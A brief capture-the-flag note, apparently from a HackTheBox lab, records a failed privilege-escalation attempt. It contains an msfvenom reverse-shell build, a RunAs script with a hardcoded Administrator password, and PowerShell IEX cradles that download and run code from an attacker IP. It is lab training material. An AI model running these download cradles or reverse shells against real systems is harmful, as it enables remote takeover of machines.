# RunAs Administrator - Failed password reuse
First we get a reverse shell.exe
```shell
root@Kali:~/HTB/Jeeves/PE# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.14.78 LPORT=443 -f exe -o shell443.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell443.exe
```
Then prepare RunAs.ps1 to be served over Python server
```shell
root@Kali:~/HTB/Jeeves/PE# cat RunAs.ps1 
$secpasswd = ConvertTo-SecureString "02yxqkinqhce" -AsPlainText -Force 
$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd)
Start-Process -FilePath "powershell.exe" -ArgumentList "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.78/rshell.ps1')" -Credential $mycreds
```
Lastly invoke it on the target with PS
```shell
PS X:\> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.78/RunAs.ps1')
rshell : This command cannot be run due to the error: The user name or password is incorrect.
At line:90 char:1
+ rshell -Reverse -IPAddress 10.10.14.78 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,rshell
```
It didn't work.